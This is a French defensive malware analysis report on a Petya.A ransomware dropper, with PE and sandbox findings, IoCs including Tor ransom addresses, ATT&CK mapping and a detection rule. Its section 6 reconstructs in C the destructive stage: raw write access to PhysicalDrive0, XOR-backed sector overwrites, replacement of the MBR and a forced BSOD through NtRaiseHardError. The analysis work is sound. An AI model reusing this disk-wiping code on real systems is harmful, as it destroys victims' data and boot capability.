# Trojan-Ransom.Win32.Petr.a (Petya.A) — Analyse détaillée

Langue : Français | English version: [README_EN.md](README_EN.md)

**Sample (fichier local) :** `Trojan-Ransom.Win32.Petr.a-26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739`  
**Famille :** Petya / Petr.a (dropper Windows → infection MBR + chiffrement MFT) — **pas** NotPetya (2017)  
**Détections historiques :** Kaspersky `Trojan-Ransom.Win32.Petr.a`, Fortinet `W32/Petr.A!tr`  
**Any.RUN :** https://any.run/report/26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739/e8b1dea2-9916-4b00-a801-e9c6d5476d73  
**Task ID :** `e8b1dea2-9916-4b00-a801-e9c6d5476d73` (Win10 19044 x64, durée **660 s**, UAC autoconfirm **on**, 2026-08-20)  
**Sources :** PE + Hex-Rays 9.4 (`*.c`) + sandbox Any.RUN + write-ups publics sur **ce** SHA256 (G DATA, Hasherezade / Malwarebytes, Check Point)

> Analyse **défensive / IR** uniquement. Le binaire n’a **pas** été exécuté hors sandbox tierce. Le payload interne (`Setup.dll`) n’a **pas** pu être extrait en clair en statique (cryptor FUD).

---

## 0. Synthèse Any.RUN ↔ code / architecture

### 0.1 Verdict sandbox (à lire avec prudence)

| Champ Any.RUN | Valeur |
|---------------|--------|
| Verdict UI | **No threats detected** (faux négatif classique sur ce vieux MBR ransomware sous Win10) |
| Tags / YARA | aucun tag ransomware affiché |
| Processus monitorés | **2** (même EXE) |
| HTTP malware | **0** |
| Fichier « drop » notable | `\\Device\Harddisk0\DR0` (accès disque bas niveau) |

### 0.2 Corrélation observations ↔ code / littérature

| Observation Any.RUN | Confirmation |
|---------------------|--------------|
| UAC autoconfirm → PID **2936** **HIGH** integrity | Manifeste `requireAdministrator` ; Stage 1 a besoin d’admin pour le disque physique |
| PID **5560** MEDIUM, exit **3221226540** (`0xC0000409` STATUS_STACK_BUFFER_OVERRUN) | Second lancement / échec sans élévation ou abort CRT — pas le happy-path admin |
| Accès `\\Device\Harddisk0\DR0` (PID 2936) | Stage 1 : écriture bas niveau (= `\\.\PhysicalDrive0` côté Win32) — **preuve sandbox** de l’intention disque |
| DNS `google.com` (whitelisted) | Cohérent avec stub Omaha/CrashHandler (look-alike Google) ; **pas** un C2 rançon |
| Réseau restant = Microsoft update/activation | Bruit OS ; ransomware offline (paiement via TOR après Stage 2) |
| Pas de faux CHKDSK / écran rouge / note | Stage 2 **non** observé sur cette VM Win10 (GPT/UEFI vs MBR BIOS, ou unpack/crash partiel) |
| Screens bureau inchangé + écrans noirs | Pas d’impact UI Conti-like ; possible tentative reboot/BSOD sans boot Petya complet |
| Verdict « clean » | **Ne pas** conclure à l’innocence : hash = Petya.A documenté ; Harddisk0 + admin = signal fort |

### 0.3 Architecture en trois étages (rappel)

Ce SHA256 est le **dropper Petya.A** (G DATA cite `26b4699a…`). En statique, le PE **ne montre pas** le code MBR/Salsa20 : surface = couche **FUD** type **Google Crash Handler**.

| Étape | Où | Rôle | Vu Any.RUN ? |
|-------|-----|------|--------------|
| **0 — Stub FUD** | PE local | CrashHandler-looking + WinRAR SFX + admin | Oui (process, google.com, pas de strings MBR) |
| **1 — Setup.dll** | RAM | Clés + écriture MBR/kernel + `NtRaiseHardError` | **Partiel** : `Harddisk0\DR0` sous HIGH ; pas de BSOD/CHKDSK clair |
| **2 — Boot / noyau** | Secteurs 16-bit | Faux CHKDSK → MFT Salsa20 → rançon | **Non** sur ce run |

```
Email (CV / Dropbox) → PE32 (ce fichier)
        │
        ▼  UAC (Any.RUN autoconfirm → HIGH)
   Stub FUD (CrashHandler-looking)
        │  unpack mémoire
        ▼
   Setup.dll  ──► \\.\PhysicalDrive0 / Harddisk0\DR0
        │
        ▼  NtRaiseHardError → reboot (souvent incomplet sur Win10 UEFI)
   Fake CHKDSK → Salsa20(MFT) → ransom  …  ← non observé ici
```

---

## 1. Point d’entrée — CRT → `wWinMain` (couche 0)

| Champ PE | Valeur |
|----------|--------|
| Type | PE32 GUI, Intel 80386 |
| ImageBase | `0x400000` |
| Entry Point RVA | `0x1716f` → VA `0x41716F` (CRT MSVC typique : `call` + `jmp` vers runtime) |
| `wWinMain` | `0x401698` |
| TimeDateStamp | `0x5690F90F` → **2016-01-09 12:11:59 UTC** |
| Sous-système | 2 (WINDOWS_GUI) |
| Overlay | **aucun** (fin fichier = fin `.reloc`) |
| PDB (CodeView RSDS) | `GoogleCrashHandler_unsigned.pdb` (age 1) |

```c
// wWinMain @ 0x401698
int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                       LPWSTR lpCmdLine, int nShowCmd)
{
  HMODULE ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  // Mitigation DLL hijack (Win8+) : LOAD_LIBRARY_SEARCH_SYSTEM32 = 0x800
  auto SetDefaultDllDirectories =
      GetProcAddress(ModuleHandleW, "SetDefaultDllDirectories");
  if (SetDefaultDllDirectories)
    SetDefaultDllDirectories(2048);

  dword_437B60 = sub_404EEA();          // init chemins / version-like
  sub_401B2A(&dword_437E14, ...);
  sub_4026A4((bool *)&v12);             // check membership / SID (admin-ish)
  if (result >= 0) {
    v9 = sub_4095D0(v14);               // construit objet CrashHandler
    return sub_4096DE((int)v9, v11);    // RunUntilShutdown-like
  }
  return result;
}
```

**Pourquoi ça compte pour l’IR**

- L’EP n’est **pas** un stub packer classique (`pushad` / `VirtualAlloc` immédiat) : c’est un binaire MSVC **cohérent** type Omaha.
- Hex-Rays suit donc le **comportement Crash Handler**, pas le code MBR — d’où l’importance de croiser avec Hasherezade (unpack dynamique → `Setup.dll`).

---

## 2. Init couche 0 — identité Google Update / Breakpad

### 2.1 Mutex et logging « Google »

```c
// logging Omaha
sub_406875(&v14, (int)L"_Google_Update_logging_mutex_", ...);
```

Autres artefacts Unicode / registre (strings PE) :

| Artefact | Valeur |
|----------|--------|
| Mutex logging | `_Google_Update_logging_mutex_` |
| Pipe named | `\\.\pipe\GoogleCrashServices` |
| Desktop isolé | `GoogleCrashHandlerWorkerDesktop` |
| Env | `CrashHandlerLaunchedForMinidump`, `GOOGLE_UPDATE_NO_CRASH_HANDLER` |
| Clés registre | `HKLM\Software\Google\Update\…`, `ClientState`, `Policies\Google\Update` |
| Fichiers | `GoogleUpdate.exe`, `GoogleUpdate.ini`, `GoogleUpdate.log`, `Google\CrashReports` |

### 2.2 Desktop isolé — **pourquoi** (Breakpad légitime détourné comme camouflage)

```c
DesktopW = CreateDesktopW(
    L"GoogleCrashHandlerWorkerDesktop",
    nullptr, nullptr, 0,
    0x10000000u,   // GENERIC_ALL
    nullptr);
SetThreadDesktop(DesktopW);
```

Chez un vrai Crash Handler, isoler le worker sur un desktop dédié limite l’impact UI des crashes. Ici, ces API + naming Google renforcent le **look-alike** FUD : un analyste / un AV basique voit des chaînes « Google Update » et un flux Breakpad (`MiniDumpWriteDump`, détection shellcode via `VirtualQueryEx`, etc.).

### 2.3 Check token / SID — `sub_4026A4`

Ouvre le process token (`OpenProcessToken`), construit un SID, teste l’appartenance (`CheckTokenMembership`-like via helpers). Aligné avec le besoin **admin** du Stage 1 (écriture disque physique) — le manifeste force déjà UAC.

### 2.4 Enchaînement `sub_4096DE`

1. Lit env `CrashHandlerLaunchedForMinidump` — si présent → chemin minidump court (`sub_40983B`).
2. Sinon initialise le handler et appelle `sub_411EC0` / `sub_4099E9` (boucle `RunUntilShutdown`).

**Limite d’analyse :** le point exact où le cryptor bascule vers le unpack de `Setup.dll` n’apparaît **pas** clairement dans le décompil (imports `VirtualAlloc` / `VirtualProtect` présents, **aucun** appel direct évident dans le `.c`). Cohérent avec un FUD qui confond le graphe de contrôle ou charge le payload hors chemins Hex-Rays « propres ».

---

## 3. Manifeste & ressources — social engineering

### 3.1 Manifeste (`manifest.xml` extrait)

```xml
<assemblyIdentity version="1.0.0.0" name="WinRAR SFX" type="win32"/>
<description>WinRAR SFX module</description>
<requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
```

| Élément | Effet |
|---------|--------|
| Nom / description WinRAR SFX | Légitime l’exécutable comme « archive auto-extractible » (CV / dossier de candidature) |
| `requireAdministrator` | Dialogue UAC — **pas** de bypass ; dépend de l’utilisateur (confirmé Hasherezade / G DATA) |
| Compat OS Vista→10 | Évite les warnings de compatibilité |

### 3.2 Ressources

| Type | Détail |
|------|--------|
| `RT_ICON` / `GROUP_ICON` | Icône 32×32 8 bpp → `icon_embedded.ico` |
| `RT_MANIFEST` | ci-dessus |
| Version info | **absente** (pas de `VS_VERSIONINFO`) |

---

## 4. Sections, entropie, blob suspect

| Section | VA | Raw size | Caractéristiques | Entropie |
|---------|-----|----------|------------------|----------|
| `.text` | `0x1000` | `0x27000` | CODE \| EXECUTE \| READ | **7.19** (élevé) |
| `.rdata` | `0x28000` | `0xC200` | INIT_DATA \| READ | 4.74 |
| `.data` | `0x35000` | `0x1A00` | INIT_DATA \| READ \| WRITE | 3.97 |
| `.rsrc` | `0x3A000` | `0x1200` | INIT_DATA \| READ | 5.53 |
| `.reloc` | `0x3C000` | `0x2400` | INIT_DATA \| READ \| DISCARDABLE | 6.59 |

Région de zone très dense dans `.text` (fichier `0x24000`–`0x26800`, ~10 KiB, H ≈ **7.91**) dumpé vers :

`blob_0x24000_high_entropy.bin`  
SHA256 : `1850b143444373795014b555bf47e593e877c525f95ea43ac77dc15f4835d09a`

- En-tête : motif répété `87 C7 04 DE` (352 octets) puis données pseudo-aléatoires.
- XOR mono-octet (y compris `0x37` utilisé par Petya pour le backup MBR) **ne** révèle **pas** de PE `MZ`/`PE` embarqué.
- Aucune string Petya (`PhysicalDrive`, `NtRaiseHardError`, `expand 32-byte k`, `.onion`, `CHKDSK`) en clair ni XOR trivial dans le PE entier.

**Conclusion :** blob = candidat payload / tables chiffrées du FUD, **non** déchiffrable offline avec les méthodes triviales testées.

---

## 5. Imports notables (couche 0)

Pas d’import crypto type `CryptGenRandom` / `CryptEncrypt` dans **ce** PE (la crypto Stage 1 vit dans `Setup.dll`).

| DLL | APIs pertinentes | Lecture défensive |
|-----|------------------|-------------------|
| KERNEL32 | `CreateFileW`, `WriteFile`, `DeviceIoControl`, `VirtualAlloc`, `VirtualProtect`, `CreateProcessW`, `CreateThread`, `CreateNamedPipeW`, `DebugActiveProcess`, `ReadProcessMemory`, `IsDebuggerPresent` | I/O + capacités d’unpack / debug Breakpad |
| ADVAPI32 | Token / SID / Registre / tracing ETW | Privilèges + config Google Update |
| USER32 | `CreateDesktopW`, `SetThreadDesktop`, `MessageBoxW`, clipboard | Desktop isolé + UI |
| SHELL32 | `SHGetFolderPathW` | Chemins profil |
| VERSION | `GetFileVersionInfo*` | Versioning modules |
| NETAPI32 | `NetWkstaGetInfo` | Info machine |
| — | `dbghelp!MiniDumpWriteDump` (dynamique) | Minidumps Crash Handler |

`DeviceIoControl(0x170002)` apparaît dans le code réseau/cartes (`\\.\%s` sur interfaces) — fingerprinting Breakpad, **pas** IOCTL disque Petya.

---

## 6. Stage 1 — `Setup.dll` et écriture sur `\\.\PhysicalDrive0`

> **Source du code :** le décompil Hex-Rays du **stub** FUD (`*.c` local) **ne contient pas** `PhysicalDrive` / boucles secteurs — ce code vit dans le payload unpacké **`Setup.dll`** (MD5 `7899d609…`).  
> Reconstruction ci-dessous d’après reverse publics sur **ce** hash / cette campagne (Hasherezade, Securelist/Kaspersky, Check Point, Infosec Institute, slides DefCamp) + preuve Any.RUN `\\Device\Harddisk0\DR0`.

Sources : Hasherezade (Malwarebytes 2016-04), G DATA, Check Point, Securelist « Petya the two-in-one trojan », Infosec Institute Part II.

### 6.1 Unpack (rappel)

1. Le stub FUD alloue / mappe un PE en mémoire continue.
2. Les RVA sont traitées comme offsets bruts (PE « aplati ») — dump naïf souvent invalide.
3. Si capturé avant destruction : DLL **`Setup.dll`**, un export (`_ZuWQdweafdsg345312@0`), crypto via **mbedTLS / PolarSSL**, MD5 `7899d6090efae964024e11f6586a69ce`.

### 6.2 Pourquoi `\\.\PhysicalDrive0` — et équivalence Any.RUN

| Chemin | Couche | Rôle |
|--------|--------|------|
| `\\.\PhysicalDrive0` | Win32 (userland) | Handle **disque entier** (pas une lettre `C:`), permet Read/Write de **secteurs 512 o** dès l’offset 0 (MBR) |
| `\\Device\Harddisk0\DR0` | NT native (vu Any.RUN) | Même objet noyau : Harddisk0, partition/raw disk DR0 |

**Pourquoi pas `C:` ?**  
Écrire sur `C:\` passe par le FS NTFS → impossible d’écraser le MBR / les secteurs avant la première partition. `PhysicalDriveN` parle au **stack stockage** (DISK class) : `CreateFile` + `SetFilePointerEx` + `ReadFile`/`WriteFile` opèrent en multiples de la taille de secteur.

**Prérequis :** token admin (Any.RUN : PID 2936 **HIGH** après UAC autoconfirm). Sans ça, `CreateFile` échoue → versions ultérieures déploient Mischa ; ici le run MEDIUM (PID 5560, exit `0xC0000409`) n’est **pas** le happy-path disque.

```
                    ┌── CreateFile("\\\\.\\PhysicalDrive0", ...)
Userland Setup.dll ─┤── DeviceIoControl (géométrie / partition style)
                    ├── boucle Read → XOR 0x37 → Write (backup)
                    ├── Write bootloader @ secteur 0
                    ├── Write kernel @ secteurs 34+
                    ├── Write config / verify @ 54–56
                    └── NtRaiseHardError → BSOD
                              │
Any.RUN files activity ───────┴── \\Device\Harddisk0\DR0  (PID 2936)
```

### 6.3 Ouverture du disque — API et flags (reconstruction)

Hasherezade : **DeviceIoControl** sert surtout à **interroger** disque/partitions ; l’infection MBR elle-même passe par **`WriteFile`** (pas un IOCTL « wipe » dédié).

Pseudo-code défensif aligné sur les RE 2016 :

```c
// Setup.dll — ouverture du disque système (reconstruction annotée)
// Nécessite : admin + (idéalement) volume non verrouillé exclusivement

HANDLE OpenPhysicalDrive0(void)
{
  // Chemin Win32 vers le 1er disque physique
  // (Check Point : parfois dérivé du volume système → PhysicalDriveN)
  HANDLE hDisk = CreateFileA(
      "\\\\.\\PhysicalDrive0",
      GENERIC_READ | GENERIC_WRITE,   // lecture MBR + écriture infection
      FILE_SHARE_READ | FILE_SHARE_WRITE,
      NULL,
      OPEN_EXISTING,                  // le device doit déjà exister
      FILE_FLAG_NO_BUFFERING |        // I/O alignée secteur (souvent requis)
      FILE_FLAG_WRITE_THROUGH,        // flush bas niveau
      NULL);

  if (hDisk == INVALID_HANDLE_VALUE) {
    // → pas d'infection MBR (droits / verrou / policy)
    return INVALID_HANDLE_VALUE;
  }
  return hDisk;
}
```

**`FILE_FLAG_NO_BUFFERING` — pourquoi**

- Les lectures/écritures doivent être des **multiples de la taille de secteur** (512 ou 4096).
- Évite le cache fichier Windows qui pourrait retarder / transformer les writes sur un objet « pas un fichier ».

### 6.4 Reconnaissance partition — `DeviceIoControl`

Avant d’écrire, `Setup.dll` interroge le style de partition :

```c
// IOCTL_DISK_GET_PARTITION_INFO_EX = CTL_CODE(IOCTL_DISK_BASE, 0x0012, ...)
PARTITION_INFORMATION_EX partInfo;
DWORD br;

BOOL ok = DeviceIoControl(
    hDisk,
    IOCTL_DISK_GET_PARTITION_INFO_EX,
    NULL, 0,
    &partInfo, sizeof(partInfo),
    &br, NULL);

// Check Point : poursuit si PARTITION_STYLE_MBR **ou** PARTITION_STYLE_GPT
// (l’infection « classique » MBR cible surtout le layout MBR ;
//  sur GPT/UEFI moderne l’effet boot peut échouer — cohérent Any.RUN Win10)
```

G DATA / Securelist : **seul le disque système** (celui du Windows) est ciblé — pas tous les `PhysicalDriveN`.

Any.RUN (Breakpad stub, **autre** IOCTL) : le `.c` local montre `DeviceIoControl(..., 0x170002, ...)` sur `\\.\%s` pour des **cartes réseau** — **ne pas** confondre avec les IOCTL disque de `Setup.dll`.

### 6.5 Génération crypto **avant** les writes (ordre volontaire)

```c
// CryptGenRandom (Windows CAPI) — Hasherezade
BYTE rnd[128];
CryptGenRandom(hProv, sizeof(rnd), rnd);

// Dérivés typiques stockés ensuite dans le secteur config (54) :
//  - clé Salsa20 32 o (ou 16 o expandue → 32)
//  - nonce / IV 8 o
//  - material pour l’ID victime (ECC / ECIES → "personal decryption code")
//  - adresses onion construites à partir du random
```

**Pourquoi avant le WriteFile :** après BSOD/reboot, le userland n’existe plus. La clé et l’ID doivent déjà être **sur le disque** (secteur 54 / structures onion) pour le noyau 16-bit et l’écran de rançon.

### 6.6 Boucle « Read → XOR `0x37` → Write » — backup destructeur

Constantes (Securelist / Infosec ; secteur = **512** octets) :

| Secteur | Contenu après infection |
|---------|-------------------------|
| **0** | Bootloader Petya (niveau 1) — **écrase** le MBR Windows |
| **1–33** | Anciens secteurs 1–33, chacun **XOR `0x37`** (`'7'`) |
| **34–50** (≈) | Noyau / loader niveau 2 (~32 secteurs au total avec data) |
| **54** | Config (clé, nonce, flag « déjà chiffré », etc.) |
| **55** | Secteur de **vérification** rempli de `0x37` |
| **56** | **MBR original** XOR `0x37` (backup pour restore si bonne clé) |

```c
// Reconstruction de la boucle secteurs 1..33 (DefCamp / Infosec)
// Pattern répété : CreateFile / SetFilePointerEx / ReadFile /
//                  XOR 0x37 / SetFilePointerEx / WriteFile

#define SECTOR 512
#define XOR_KEY 0x37u

static void xor_buf(BYTE *buf, DWORD len, BYTE key)
{
  for (DWORD i = 0; i < len; i++)
    buf[i] ^= key;
}

// Backup + chiffrement trivial des secteurs 1 → 33
for (DWORD sec = 1; sec <= 33; sec++) {
  BYTE buf[SECTOR];
  DWORD rd = 0, wr = 0;
  LARGE_INTEGER off;
  off.QuadPart = (LONGLONG)sec * SECTOR;

  SetFilePointerEx(hDisk, off, NULL, FILE_BEGIN);
  ReadFile(hDisk, buf, SECTOR, &rd, NULL);   // lit le secteur sain

  xor_buf(buf, SECTOR, XOR_KEY);             // « chiffre » XOR 0x37

  SetFilePointerEx(hDisk, off, NULL, FILE_BEGIN);
  WriteFile(hDisk, buf, SECTOR, &wr, NULL);  // réécrit sur place
}

// Secteur 0 (MBR) : XOR → copie vers secteur 56, puis overwrite @ 0
BYTE mbr[SECTOR];
LARGE_INTEGER z = {0};
SetFilePointerEx(hDisk, z, NULL, FILE_BEGIN);
ReadFile(hDisk, mbr, SECTOR, &rd, NULL);

BYTE mbr_bak[SECTOR];
memcpy(mbr_bak, mbr, SECTOR);
xor_buf(mbr_bak, SECTOR, XOR_KEY);

LARGE_INTEGER off56;
off56.QuadPart = 56LL * SECTOR;
SetFilePointerEx(hDisk, off56, NULL, FILE_BEGIN);
WriteFile(hDisk, mbr_bak, SECTOR, &wr, NULL);  // backup @ 56

// Conserver NT disk signature + table de partitions du MBR d’origine
// (offsets ~0x1B8..0x1FF) dans le nouveau bootloader — Securelist
// puis :
SetFilePointerEx(hDisk, z, NULL, FILE_BEGIN);
WriteFile(hDisk, petya_mbr_template, SECTOR, &wr, NULL); // MBR malveillant
```

**Pourquoi XOR `0x37` et pas un vrai chiffrement ici ?**

1. **Rapidité** userland avant BSOD.
2. **Réversibilité** : si la victime paie / fournit la bonne clé Salsa20, le bootloader peut restaurer le MBR depuis le secteur 56 (`buf[i] ^= 0x37` à nouveau).
3. **Anti-récupération naïve** : un `fixmbr` seul ne suffit pas — la table/partitions et les secteurs suivants sont aussi altérés ; le MFT sera chiffré au Stage 2.

### 6.7 Écriture du noyau @ secteur 34+

```c
// Hasherezade : kernel démarre @ 0x4400 (= secteur 34 * 512)
// Longeur typique : ~32 secteurs (bootloader charge 32 secteurs → 0x8000)

LARGE_INTEGER off34;
off34.QuadPart = 34LL * SECTOR;   // 0x4400
SetFilePointerEx(hDisk, off34, NULL, FILE_BEGIN);
WriteFile(hDisk, petya_kernel_blob, kernel_size /* ~32*512 */, &wr, NULL);

// Secteur 54 : configuration (clé Salsa20, nonce, flag encryption=0, onion…)
// Secteur 55 : memset(buf, 0x37, 512) — buffer de vérification post-paiement
```

Le bootloader (secteur 0) charge ce blob en 16-bit réel, puis le « faux CHKDSK » chiffre la **MFT** avec Salsa20 (Stage 2 — hors de ce §).

### 6.8 Crash forcé — `NtRaiseHardError` (après les writes)

**Ordre critique :** toutes les écritures disque sont **terminées** avant le BSOD. Sinon Stage 2 n’a ni clé ni bootloader.

```c
// Privilège shutdown
HANDLE hToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
// LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid);
// AdjustTokenPrivileges(... SeShutdownPrivilege ...);

// Variante documentée (aussi via RtlAdjustPrivilege(19) = SE_SHUTDOWN_PRIVILEGE)
typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
    NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask, PULONG_PTR Parameters,
    ULONG ValidResponseOptions, PULONG Response);

HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
NtRaiseHardError_t NtRaiseHardError =
    (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");

ULONG resp = 0;
// STATUS_HOST_DOWN = 0xC0000350 ; OptionShutdownSystem = 6
NtRaiseHardError(0xC0000350, 0, 0, NULL, 6, &resp);
// → BSOD → reboot → exécution du nouveau MBR
```

### 6.9 Lien Any.RUN (ce sample, task `e8b1dea2-…`)

| Fait sandbox | Interprétation |
|--------------|----------------|
| Files activity : `\\Device\Harddisk0\DR0` sous PID **2936** | Handle raw disk ouvert / I/O — **même intention** que `CreateFile("\\\\.\\PhysicalDrive0")` |
| Integrity **HIGH** | Condition nécessaire aux writes |
| Pas de faux CHKDSK / écran rouge | Writes éventuellement partiels **ou** MBR écrit mais boot UEFI/GPT ignore le code 16-bit → Stage 2 UI absent |
| Verdict « No threats detected » | Les signatures Any.RUN n’ont pas classé l’I/O Harddisk0 comme ransomware — **faux négatif** |

### 6.10 Fenêtre IR / détection

| Moment | État disque | Action défensive |
|--------|-------------|------------------|
| Pendant `WriteFile` / juste après, **avant** BSOD | MBR déjà sale, MFT encore OK | **Ne pas rebooter** ; dump `dd` du disque ; montage offline |
| Après BSOD + faux CHKDSK | MFT chiffrée Salsa20 | Récupération clé / decryptor version-spécifique |
| IOC runtime | `CreateFile` sur `\\.\PhysicalDrive0` + `WriteFile` 512 o + `NtRaiseHardError` | Règle EDR / Sysmon (accès raw disk depuis process user atypical) |

**Snippets EDR (idée de détection, pas un bypass) :**

```
DeviceImage = *\PhysicalDrive0
AND CreateFile access = Write
AND process NOT IN (setup storage vendors, disk tools signed)
→ alert + suspend (surtout si suivi de NtRaiseHardError)
```

---

## 7. Stage 2 — bootloader + noyau (16-bit)

1. Boot → charge le noyau (secteur 34).
2. Flag secteur 54 : si non chiffré → **faux CHKDSK** (chiffrement MFT Salsa20) ; sinon écran rouge.
3. Après chiffrement, la clé Salsa20 en clair est **effacée** du secteur.
4. Note : art ASCII crâne, URLs TOR, demande Bitcoin, saisie de la clé (16+ caractères, charset custom).

Crypto noyau : Salsa20 (implémentation 16-bit fragile — vulnérabilités documentées Check Point / leo-stone ; decryptors publics pour **anciennes** versions Janus).

**Hors scope NotPetya :** pas d’EternalBlue, pas de Mimikatz, pas de worm LAN — campagne email 2016.

---

## 8. Chiffrement — modèle (impact)

| Couche | Cible | Primitive | Récupération |
|--------|-------|-----------|--------------|
| Stub | — | FUD (opaque ici) | N/A |
| Setup.dll | MBR + metadata disque | ECC wrap de la clé session | Identifiant Tor panel |
| Kernel | **MFT NTFS** (pas chaque fichier) | Salsa20-256 + nonce | Clé 16 chars validée sur buffer secteur 55 |

Les fichiers restent souvent présents en raw ; sans MFT le volume est inutilisable. D’où la confusion « full disk encryption » dans la note.

---

## 9. Cleanup / anti-recovery

| Action | Étape | Effet |
|--------|-------|-------|
| Écrasement MBR | 1 | Boot Windows impossible sans restore |
| Backup XOR 0x37 | 1 | Resta MBR possible si dump pré-Stage2 |
| Effacement clé Salsa20 | 2 | Après faux CHKDSK, clé RAM/disque partie |
| Pas de C2 HTTP | 1–2 | Paiement via TOR uniquement |
| Pas de VSS wipe userland classique | — | Impact = MFT + boot, pas Conti-like `vssadmin` |

---

## 10. Timeline (infection typique)

| T | Événement |
|---|-----------|
| T0 | Ouverture du « CV » / SFX → UAC admin |
| T0+ | Stub CrashHandler-like charge ; unpack `Setup.dll` |
| T1 | Écriture MBR + kernel ; `NtRaiseHardError` |
| T2 | Reboot → faux CHKDSK (chiffrement MFT) |
| T3 | Reboot / suite → écran rançon TOR/Bitcoin |
| Tsalvage | Entre T1 et T2 : dump disque encore récupérable |

---

## 11. IoCs

### 11.1 Fichier analysé (couche 0)

```
MD5     af2379cc4d607a45ac44d62135fb7015
SHA1    39b6d40906c7f7f080e6befa93324dddadcbd9fa
SHA256  26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739
Size    230912
PDB     GoogleCrashHandler_unsigned.pdb
Compile 2016-01-09 12:11:59 UTC
```

### 11.2 Artefacts strings / runtime (stub) + sandbox

```
Mutex     _Google_Update_logging_mutex_
Pipe      \\.\pipe\GoogleCrashServices
Desktop   GoogleCrashHandlerWorkerDesktop
Manifest  WinRAR SFX + requireAdministrator
Any.RUN   \\Device\Harddisk0\DR0   (PID 2936, HIGH)
Any.RUN   exit 3221226540 (PID 5560, MEDIUM)
Task      e8b1dea2-9916-4b00-a801-e9c6d5476d73
```

### 11.3 Payload / campagnes liés (littérature, même famille)

```
Setup.dll MD5     7899d6090efae964024e11f6586a69ce
Setup.dll SHA256  542a38bf52afa6a4a008089a6fbf22c9d68ef5d6c634dd2c0773d859a8ae2bbf
Kernel dump MD5   d80fc07cc293bcd36e630d45a34aca11
XOR backup MBR    0x37
Disk device       \\.\PhysicalDrive0
```

### 11.4 TOR / contact (versions Petya / Mischa — IoC réseau historique)

```
hxxp://petya3jxfp2f7g3i[.]onion/
hxxp://petya3sen7dyko2n[.]onion/
hxxp://mischapuk6hyrn72[.]onion/
hxxp://mischa5xyix2mrhd[.]onion/
```

(Variantes ultérieures GoldenEye / Mischa ajoutent d’autres chemins ; valider selon la note affichée.)

### 11.5 Blob local non déchiffré

```
blob_0x24000_high_entropy.bin
SHA256  1850b143444373795014b555bf47e593e877c525f95ea43ac77dc15f4835d09a
Offset  file 0x24000 (dans .text)
```

---

## 12. Captures Any.RUN (après tri)

Dossier local : `anyrun_screenshots/` — **3 JPEG** conservés (1360×768) + `README_captures.md`.

| # | Fichier | Contenu | Rôle dans le rapport |
|---|---------|---------|----------------------|
| 01 | `screen_01_ea921e89-72e3-48b9-9dad-30e942b59240.jpg` | Bureau Win10 Any.RUN inchangé (pas d’icônes chiffrées / pas de note) | Preuve que le **Stage 2 UI** n’a pas eu lieu sur ce run |
| 03 | `screen_03_ff308157-303b-4459-9b63-ca693a8d884a.jpg` | Écran noir | Coupure affichage (reboot / session) — **pas** le faux CHKDSK documenté en 2016 |
| 06 | `screen_06_fef71e22-a773-47c5-a1fb-ac078b0abb07.jpg` | Écran noir | Même famille ; doublons bureau 02/04/05 écartés |

```
anyrun_screenshots/
├── README_captures.md
├── screen_01_ea921e89-72e3-48b9-9dad-30e942b59240.jpg   ← desktop
├── screen_03_ff308157-303b-4459-9b63-ca693a8d884a.jpg   ← noir
└── screen_06_fef71e22-a773-47c5-a1fb-ac078b0abb07.jpg   ← noir
```

---

## 13. ATT&CK

| Technique | ID | Preuve |
|-----------|-----|--------|
| User Execution | T1204.002 | Email CV / Dropbox → EXE ; Any.RUN parent `explorer.exe` |
| Abuse Elevation Control (UAC) | T1548.002 | Manifeste admin + Any.RUN HIGH integrity (PID 2936) |
| Masquerading | T1036 | WinRAR SFX + Google Crash Handler naming |
| Obfuscated Files or Information | T1027 | Cryptor FUD ; payload non clair |
| Native API | T1106 | `NtRaiseHardError` (Stage 1, littérature) |
| Disk Structure Wipe / bootkit | T1561.002 / T1542.003 | MBR (littérature) ; Any.RUN `Harddisk0\DR0` |
| Data Encrypted for Impact | T1486 | MFT Salsa20 (littérature ; **non** vu UI sandbox) |
| Inhibit System Recovery | T1490 | Boot + MFT si Stage 2 complet |
| System Shutdown/Reboot | T1529 | BSOD forcé (littérature) ; écrans noirs sandbox |
| Application Layer Protocol (Tor) | T1071 | Panel onion (hors stub ; hors ce run) |

---

## 14. Fichiers produits dans ce dossier

```
anyrun_screenshots/
  README_captures.md
  screen_01_ea921e89-72e3-48b9-9dad-30e942b59240.jpg
  screen_03_ff308157-303b-4459-9b63-ca693a8d884a.jpg
  screen_06_fef71e22-a773-47c5-a1fb-ac078b0abb07.jpg
Trojan-Ransom.Win32.Petr.a-26b4699a…          ← sample PE
Trojan-Ransom.Win32.Petr.a-26b4699a….c        ← Hex-Rays 9.4
manifest.xml                                 ← RT_MANIFEST extrait
icon_embedded.ico                            ← icône ressource
blob_0x24000_high_entropy.bin                ← zone .text haute entropie
README.md                                    ← ce document
README_EN.md                                 ← English
```

**Non produits (raisons) :** `Setup.dll` clair, note de rançon extraite du PE, overlay RSA type Conti, scripts `vssadmin` — absents de cette couche / non déchiffrés en statique / non droppés sur ce run Any.RUN.

---

## 15. Limites & suite recommandée

1. **Pas d’exécution locale** hors sandbox tierce (destructif pour le disque).
2. Any.RUN Win10 19044 : detonation **partielle** (Harddisk0 oui, Stage 2 UI non). Pour un Stage 2 complet, VM **BIOS/MBR** plus proche de 2016, ou analyse hors-ligne du dump disque juste après `Harddisk0\DR0`.
3. Unpack `Setup.dll` : dump mémoire au bon moment (méthode Hasherezade).
4. Ne pas confondre avec **NotPetya** (`71b6a493…` etc.).
5. Decryptors publics (leo-stone, clés Janus 2017) : anciennes variantes seulement.

---

*Fin du rapport.*
